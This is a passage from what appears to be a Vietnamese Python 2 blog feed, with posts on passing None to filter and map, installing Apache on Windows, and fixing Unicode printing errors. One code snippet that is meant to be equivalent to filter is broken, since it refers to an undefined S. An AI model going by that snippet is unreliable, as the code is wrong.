&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;[]])&lt;/span&gt;
&lt;span class="go"&gt;[False, []]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để loại bỏ các phần tử không trong danh sách &lt;tt class="docutils literal"&gt;L&lt;/tt&gt;, đơn giản là bạn dùng hàm ánh xạ đồng nhất &lt;tt class="docutils literal"&gt;f(x) = x&lt;/tt&gt; ví dụ như &lt;tt class="docutils literal"&gt;filter(lambda x: x, L)&lt;/tt&gt;. Hàm này tương đương với:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;def filter(func, list):&lt;/span&gt;
&lt;span class="go"&gt;    return [x for x in list if x not in S]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cuối cùng một cách viết gây khó hiểu là thay thế &lt;tt class="docutils literal"&gt;lambda x: x&lt;/tt&gt; bằng hàm &lt;strong&gt;None&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;filter(None, list) # &amp;lt;==&amp;gt; filter(lambda x: x, list)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;0j&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([]),&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt; &lt;span class="p"&gt;{},&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;abc&amp;#39;, &amp;#39; &amp;#39;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[1, 2]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ở đây chúng ta có cảm giác như &lt;strong&gt;None&lt;/strong&gt; được dùng như một hàm. Thực ra không phải vậy, &lt;strong&gt;None&lt;/strong&gt; có nghĩa là không có hàm nào ở đây cả, nói cách khác đối số đầu tiên của &lt;strong&gt;filter&lt;/strong&gt; bị khuyết. Python lúc đó sẽ dùng hàm mặc định gì đó tương tự như &lt;tt class="docutils literal"&gt;lambda x: x&lt;/tt&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="dung-none-voi-map"&gt;
&lt;h2&gt;4. Dùng None với map&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;}])&lt;/span&gt;
&lt;span class="go"&gt;[1, 2, {1: 2}]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;map&lt;/strong&gt; không thay đổi danh sách khi nó bị khuyết hàm tác động. Khi đó hàm &lt;strong&gt;None&lt;/strong&gt; tương đương với ánh xạ đồng nhất (mặc dù không chính xác, vì thực ra là không có hàm nào cả, Python có thể đã sử dụng hàm mặc định). Tuy nhiên dùng hàm &lt;strong&gt;None&lt;/strong&gt; khi có hai danh sách trở lên thì lại tạo ra &lt;em&gt;khả năng đặc biệt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[(1, 3), (2, 4)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[(1, 3, 5), (2, 4, 6)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Khả năng này tương đương với &lt;strong&gt;zip&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[(1, 3, 5), (2, 4, 6)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[(1, 3), (2, 4)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Diễn giải của nó như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[(1, 3), (2, 4)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;[(1, 3, 5), (2, 4, 6)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Một lần nữa trong mục này, mặc dù &lt;strong&gt;None&lt;/strong&gt; bao hàm ý nghĩa về sự khuyết giá trị, song trong triển khai của hàm bất kỳ việc khuyết giá trị dẫn đến việc sử dụng các hàm mặc định. Lúc đó &lt;strong&gt;None&lt;/strong&gt; có ý nghĩa là những gì mặc định. Đôi khi có thể ngắn gọn coi nó cũng là một hàm đặc biệt, hàm &lt;strong&gt;None&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Chú ý quan trọng: Các test của bài viết này được thử trên &lt;strong&gt;python 2.5.x&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
</content><category term="None"></category><category term="ngôn ngữ"></category><category term="kiểu dữ liệu"></category></entry><entry><title>Lập trình web với Python (1)</title><link href="/2009/12/lap-trinh-web-voi-python-1.html" rel="alternate"></link><published>2009-12-17T09:07:00+07:00</published><updated>2009-12-17T09:07:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2009-12-17:/2009/12/lap-trinh-web-voi-python-1.html</id><summary type="html">&lt;p&gt;Trong loạt bài lập trình web với Python, tôi sẽ hướng dẫn bạn đọc những thao tác cơ bản từ việc cài đặt, cấu hình, cho đến lập trình, hoàn thành một ứng dụng web đơn giản. Qua quá trình đó, bạn đọc sẽ được giới thiệu về kỹ thuật …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong loạt bài lập trình web với Python, tôi sẽ hướng dẫn bạn đọc những thao tác cơ bản từ việc cài đặt, cấu hình, cho đến lập trình, hoàn thành một ứng dụng web đơn giản. Qua quá trình đó, bạn đọc sẽ được giới thiệu về kỹ thuật CGI, đến FastCGI và cuối cùng là WSGI.&lt;/p&gt;
&lt;div class="section" id="cai-dat-may-chu-web-apache"&gt;
&lt;h2&gt;Cài đặt máy chủ web Apache&lt;/h2&gt;
&lt;p&gt;Để lập trình web, chúng ta cần một máy chủ phục vụ web. Máy chủ &lt;a class="reference external" href="http://httpd.apache.org/"&gt;Apache HTTP&lt;/a&gt; là một trong những phần mềm máy chủ web phổ dụng trên Internet. Chúng ta sẽ cần tải bản cài đặt phần mềm này về. Tôi sẽ sử dụng phiên bản 2.2.14 (&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;apache_2.2.14-win32-x86-openssl-0.9.8k.msi&lt;/span&gt;&lt;/tt&gt;) cho các bài viết trong loạt bài này. Hệ điều hành tôi đang sử dụng là Windows 7.&lt;/p&gt;
&lt;p&gt;Khi chạy tập tin cài đặt, chúng ta sẽ gặp giao diện như sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-1.png" /&gt;
&lt;p&gt;Nhấn vào nút &lt;strong&gt;Next&lt;/strong&gt; để qua màn hình kế:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-2.png" /&gt;
&lt;p&gt;Chọn ô đầu tiên để đồng ý với cam kết bản quyền, và nhấn nút &lt;strong&gt;Next&lt;/strong&gt; để qua trang kế:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-3.png" /&gt;
&lt;p&gt;Tiếp tục nhấn nút &lt;strong&gt;Next&lt;/strong&gt;:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-4.png" /&gt;
&lt;p&gt;Điền thông tin vào các ô trống như trong hình ví dụ, và nhấn &lt;strong&gt;Next&lt;/strong&gt;:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-5.png" /&gt;
&lt;p&gt;Chọn kiểu cài đặt &lt;strong&gt;Typical&lt;/strong&gt; và nhấn nút &lt;strong&gt;Next&lt;/strong&gt;:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-6.png" /&gt;
&lt;p&gt;Nếu bạn muốn thay đổi đường dẫn cài đặt thì bạn sẽ chỉnh trong trang này, còn không thì nhấn nút &lt;strong&gt;Next&lt;/strong&gt;:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-7.png" /&gt;
&lt;p&gt;Nhấn nút &lt;strong&gt;Install&lt;/strong&gt; để bắt đầu quá trình cài đặt:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-8.png" /&gt;
&lt;p&gt;Chúng ta sẽ được thông báo về quá trình cài đặt.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-9.png" /&gt;
&lt;p&gt;Sau khi cài đặt hoàn thành, nhấn &lt;strong&gt;Finish&lt;/strong&gt; để kết thúc:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-10.png" /&gt;
&lt;p&gt;Nhấn vào nút &lt;strong&gt;Start&lt;/strong&gt; và nhập vào &lt;strong&gt;services.msc&lt;/strong&gt; như hình trên để kiểm tra sự tồn tại của máy chủ web Apache2:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-11.png" /&gt;
&lt;p&gt;Như hình trên, dịch vụ Apache2 đã được chạy (started). Để kiểm tra thì chúng ta sẽ mở Internet Explorer (IE) lên và truy cập vào địa chỉ &lt;strong&gt;http://localhost&lt;/strong&gt;. Nếu bạn nhận được kết quả như hình bên dưới đây thì bạn đã hoàn thành việc cài đặt máy chủ web Apache rồi đó.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-apache/apache-install-12.png" /&gt;
&lt;p&gt;Trong bài tới chúng ta sẽ tiếp tục thực hiện việc cài đặt Python.&lt;/p&gt;
&lt;/div&gt;
</content><category term="apache"></category><category term="install"></category></entry><entry><title>In chuỗi unicode ra màn hình</title><link href="/2009/12/in-chuoi-unicode-ra-man-hinh.html" rel="alternate"></link><published>2009-12-16T14:33:00+07:00</published><updated>2009-12-16T14:33:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2009-12-16:/2009/12/in-chuoi-unicode-ra-man-hinh.html</id><summary type="html">&lt;p&gt;Một ngày nào đấy, có lẽ bạn sẽ rất bực mình khi gặp phải một lỗi tương tự như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;c:\tmp&amp;gt;&lt;/span&gt;c&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Python26\python.exe&lt;/span&gt;&lt;span class="c1"&gt; helloworld.py&lt;/span&gt;
&lt;span class="go"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="gp"&gt;  File &amp;quot;helloworld.py&amp;quot;, line 3, in &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    print u&amp;quot;Xin ch├áo bß║ín, Python!&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;c …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Một ngày nào đấy, có lẽ bạn sẽ rất bực mình khi gặp phải một lỗi tương tự như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;c:\tmp&amp;gt;&lt;/span&gt;c&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Python26\python.exe&lt;/span&gt;&lt;span class="c1"&gt; helloworld.py&lt;/span&gt;
&lt;span class="go"&gt;Traceback (most recent call last):&lt;/span&gt;
&lt;span class="gp"&gt;  File &amp;quot;helloworld.py&amp;quot;, line 3, in &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    print u&amp;quot;Xin ch├áo bß║ín, Python!&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;  File &amp;quot;c:\Python26\lib\encodings\cp437.py&amp;quot;, line 12, in encode&lt;/span&gt;
&lt;span class="go"&gt;    return codecs.charmap_encode(input,errors,encoding_map)&lt;/span&gt;
&lt;span class="go"&gt;UnicodeEncodeError: &amp;#39;charmap&amp;#39; codec can&amp;#39;t encode character u&amp;#39;\u1ea1&amp;#39; in position&lt;/span&gt;
&lt;span class="gp"&gt; 10: character maps to &amp;lt;undefined&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mã nguồn của &lt;tt class="docutils literal"&gt;helloworld.py&lt;/tt&gt; chỉ đơn giản như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Xin chào bạn, Python!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lỗi này xảy ra vì chúng ta đang in một chuỗi unicode, với các ký tự nằm ngoài bảng mã ASCII (hoặc bảng mã mặc định của màn hình hiện tại).&lt;/p&gt;
&lt;p&gt;Khi gặp phải các ký tự nằm ngoài bảng mã này, Python mặc định sẽ nâng một biệt lệ cho biết chính xác đó là ký tự nào, nằm ở vị trí nào. Như ví dụ trên, đó là ký tự &lt;tt class="docutils literal"&gt;ạ&lt;/tt&gt; có mã unicode là &lt;strong&gt;1EA1&lt;/strong&gt; nằm tại vị trí thứ &lt;strong&gt;10&lt;/strong&gt; (vị trí bắt đầu là 0) trong chuỗi &lt;tt class="docutils literal"&gt;Xin chào bạn, Python!&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Có một số cách để khắc phục lỗi này, từ việc thay đổi một số biến môi trường, cho đến việc sửa từng dòng lệnh. Tất cả đều nhằm một mục đích là chuyển &lt;strong&gt;chuỗi unicode&lt;/strong&gt; cần in thành &lt;strong&gt;chuỗi byte&lt;/strong&gt; theo bảng mã UTF-8.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Thay đổi biến môi trường: Biến môi trường &lt;tt class="docutils literal"&gt;PYTHONIOENCODING&lt;/tt&gt; được dùng để định nghĩa bảng mã cho các bộ nhập chuẩn, bộ xuất chuẩn, và bộ lỗi chuẩn (stdin, stdout, stderr). Chúng ta có thể định nghĩa biến môi trường này thành &lt;strong&gt;utf-8&lt;/strong&gt; như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;c:\tmp&amp;gt;&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nv"&gt;PYTHONIOENCODING&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;utf-8

&lt;span class="gp"&gt;c:\tmp&amp;gt;&lt;/span&gt;c&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Python26\python.exe&lt;/span&gt;&lt;span class="c1"&gt; helloworld.py&lt;/span&gt;
&lt;span class="go"&gt;Xin ch├áo bß║ín, Python!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Thay đổi bộ xuất chuẩn: Bộ xuất chuẩn (&lt;tt class="docutils literal"&gt;sys.stdout&lt;/tt&gt;) có thể được &amp;quot;gói&amp;quot; trong bảng mã mới thông qua mô-đun &lt;tt class="docutils literal"&gt;codecs&lt;/tt&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;codecs&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;writer_factory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getwriter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;writer_factory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Xin chào bạn, Python!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;c:\tmp&amp;gt;&lt;/span&gt;c&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Python26\python&lt;/span&gt;&lt;span class="c1"&gt; helloworld.py&lt;/span&gt;
&lt;span class="go"&gt;Xin ch├áo bß║ín, Python!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Thay đổi từng dòng lệnh &lt;tt class="docutils literal"&gt;print&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Xin chào bạn, Python!&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;c:\tmp&amp;gt;&lt;/span&gt;c&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Python26\python&lt;/span&gt;&lt;span class="c1"&gt; helloworld.py&lt;/span&gt;
&lt;span class="go"&gt;Xin ch├áo bß║ín, Python!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Như chúng ta thấy, cách nào cũng dẫn đến cùng một kết quả mong muốn. Việc áp dụng cách nào sẽ phụ thuộc vào hoàn cảnh của từng chương trình.&lt;/p&gt;
